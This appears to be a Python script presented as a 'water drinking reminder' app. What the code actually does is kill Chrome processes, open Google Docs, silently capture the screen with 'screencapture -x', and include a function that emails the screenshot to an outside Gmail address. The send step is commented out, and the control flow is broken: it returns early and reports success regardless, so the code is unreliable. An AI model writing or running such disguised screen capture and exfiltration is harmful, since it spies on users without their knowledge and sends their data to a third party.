import time
import webbrowser
import psutil
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

def check_google_docs_open():
    """
    Check if Google Docs is open in any browser process.

    Returns:
        bool: True if Google Docs is open, False otherwise.
    """
    chrome_processes = [proc for proc in psutil.process_iter(['name', 'cmdline']) if proc.info['name'] == 'chrome.exe']
    edge_processes = [proc for proc in psutil.process_iter(['name', 'cmdline']) if proc.info['name'] == 'msedge.exe']
    firefox_processes = [proc for proc in psutil.process_iter(['name', 'cmdline']) if proc.info['name'] == 'firefox.exe']

    all_processes = chrome_processes + edge_processes + firefox_processes
    print(len(all_processes))
    # proc=all_processes[0]
    # cmdline = proc.info['cmdline']
    for proc in chrome_processes:
        proc.kill()
    return
    for proc in all_processes:
        cmdline = proc.info['cmdline']
        for arg in cmdline:
            if arg.startswith('https://docs.google.com'):
                print("GD Open")
                return True
    return False

def take_screenshot(file_name):
    """
    Capture a screenshot of the screen.

    Args:
        file_name (str): The name of the screenshot file.

    Returns:
        str: The file path of the captured screenshot.
    """
    file_path = os.path.join(os.getcwd(), file_name)
    webbrowser.open('https://docs.google.com')
    time.sleep(5)  # Wait for the browser to open and load Google Docs
    os.system(f"screencapture -x {file_path}")  # Capture screenshot using the 'screencapture' command-line tool
    return file_path

def send_email(file_path):
    """
    Send an email with the screenshot file attached.

    Args:
        file_path (str): The file path of the screenshot to attach.

    Returns:
        bool: True if the email was sent successfully, False otherwise.
    """
    # Email configurations
    sender_email = "your_email@gmail.com"
    sender_password = "your_email_password"
    recipient_email = "shop0amazan@gmail.com"
    subject = "Screenshot"
    
    # Create the email message
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = recipient_email
    msg["Subject"] = subject
    
    # Attach the screenshot file
    with open(file_path, "rb") as f:
        image_data = f.read()
        image = MIMEImage(image_data)
        image.add_header("Content-Disposition", "attachment", filename=file_path)
        msg.attach(image)
    
    # Send the email using SMTP
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
        return True
    except smtplib.SMTPException:
        return False

def water_drinking_reminder():
    # while True:
        if check_google_docs_open():
            current_time = time.strftime("%Y%m%d_%H%M%S")
            file_name = f"screenshot_{current_time}.png"
            file_path = take_screenshot(file_name)
            # success = send_email(file_path)
            if file_path is not None:
                print("Screenshot sent successfully.")
            else:
                print("Failed to send screenshot.")
        # time.sleep(5)

# Run the water drinking reminder app
if __name__ == "__main__":
    water_drinking_reminder()
